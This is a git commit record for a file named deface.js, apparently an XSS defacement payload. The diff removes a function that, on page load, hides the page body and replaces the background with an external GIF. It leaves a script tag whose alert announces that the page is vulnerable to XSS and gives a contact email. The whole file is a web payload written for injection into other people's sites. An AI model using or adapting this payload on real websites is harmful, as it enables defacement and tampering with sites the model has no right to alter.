4d79cbf5fbc9d62f8f8cfa4f8cd0a95a2574c807
webgeardarko <webgeardarko@gmail.com>
2018-07-29 00:20:34 -0700

    update

--- deface.js
+++ deface.js
@@ -1,11 +1,3 @@
 <script>
-function XSS() {
-    document.body.style.display = "none";
-    document.body.style.backgroundColor = "#000";
-    document.body.style.backgroundImage = "url('https://i.imgur.com/Kbad6dr.gif')";
-    document.body.style.backgroundRepeat = "no-repeat";
-    document.body.style.backgroundSize = "cover";
     alert('This page is vulnerable to XSS! Email - AntiGuyXSS@gmail.com');
-}
-window.onload=XSS;
 </script> 
